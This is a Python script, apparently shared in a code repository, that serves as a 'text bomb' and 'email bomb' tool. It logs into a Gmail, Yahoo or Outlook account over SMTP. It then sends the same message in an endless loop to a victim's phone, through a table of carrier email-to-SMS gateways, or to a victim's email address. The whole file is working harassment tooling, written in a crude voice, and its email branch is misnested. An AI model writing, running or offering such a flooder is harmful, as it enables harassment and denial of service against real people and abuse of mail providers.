#!/usr/bin/python3
# Originally Coded By: Max00355 - Forked by ZodiacGlass & Sheogorath also cocks
#AlsoKoks2tits

import smtplib as s
import getpass as g
import sys

print("""You ready to fuck shit up?

1. Hell ya!
2. Wait, I'm not ready
""")
pro_opt = input()
print("\n\r")
if pro_opt == "1":
#attack_pro = 0
	print("""What is your email provider?
1. Gmail
2. Yahoo!
3. Hotmail
	""")
	pro_option = input()
	if pro_option == "1":
		#attack_pro = 'gmail'
		username = input('Email Username:')
		password = g.getpass('Password:')
		server = s.SMTP('smtp.gmail.com',587)
		server.starttls()
		server.login(username, password)
	if pro_option == "2":
		#attack_pro = 'yahoo'
		username = input('Email Username:')
		password = g.getpass('Password:')
		server = s.SMTP('smtp.mail.yahoo.com',587)
		server.starttls()
		server.login(username, password)
	if pro_option == "3":
		#attack_pro = 'hotmail'
		username = input('Email Username:')
		password = g.getpass('Password:')
		server = s.SMTP('smtp-mail.outlook.com',587)
		server.starttls()
		server.login(username, password)

	print( """What would you like to do?

1. Text Bomb
2. Email Bomb
	""")
	option = input()
	print("\n\r")
	if option == "1":
		carrier_attack = 0
		print( """What is their carrier?
1. Verizon
2. Straight Talk
3. AT&T
4. AT&T Mobility (formerly Cingular)
5. Sprint (PCS)
6. Sprint (Nextel)
7. T-Mobile
8. Telus
9. Alltel
10. Virgin Mobile
11. Orange
12. Boost Mobile
13. Cricket
14. Metro PCS
15. U.S. Cellular
\n\r
		""")
		carrier = input()

		if carrier == "1":
			carrier_attack = "@vtext.com"
		if carrier == "2":
			carrier_attack = "@vtext.com"
		if carrier == "3":
			carrier_attack = "@txt.att.net"
		if carrier == "4":
			carrier_attack = "@cingularme.com"
		if carrier == "5":
			carrier_attack = "@messaging.sprintpcs.com"
		if carrier == "6":
			carrier_attack = "@page.nextel.com"
		if carrier == "7":
			carrier_attack = "@tmomail.net"
		if carrier == "8":
			carrier_attack = "@msg.telus.com"
		if carrier == "9":
			carrier_attack = "@text.wireless.alltel.com"
		if carrier == "10":
			carrier_attack = "@vmobl.com"
		if carrier == "11":
			carrier_attack = "@sms.orange.pl"
		if carrier == "12":
			carrier_attack = "@myboostmobile.com"
		if carrier == "13":
			carrier_attack = "@sms.mycricket.com"
		if carrier == "14":
			carrier_attack = "@mymetropcs.com"
		if carrier == "15":
			carrier_attack = "@email.uscc.net"

		v_phone = input("Victim's Phone Number: ") + str(carrier_attack)
		message = input("Message: ")
		phone_message = ("From: %s\r\nTo: %s \r\n\r\n %s"
			% (username, "" .join(v_phone), "" .join(message)))

		while option == "1":
			server.sendmail(username, v_phone, phone_message)
			print("Bombing... Press Ctrl + C To Stop")
		if option == "2":
			v_email = input("Victim's Email: ")
			message = input("Message: ")
			email_message = (" \r\n\r\n From: %s\r\n To: %s\r\n\r\n  %s"
							% (username, "" .join(v_email), "" .join(message)))
		while "1":
			server.sendmail(username, v_email, email_message)
			print("Bombing... Press Ctrl + C To Stop")
if pro_opt == "2":
	print(quit())

    #testing repo2
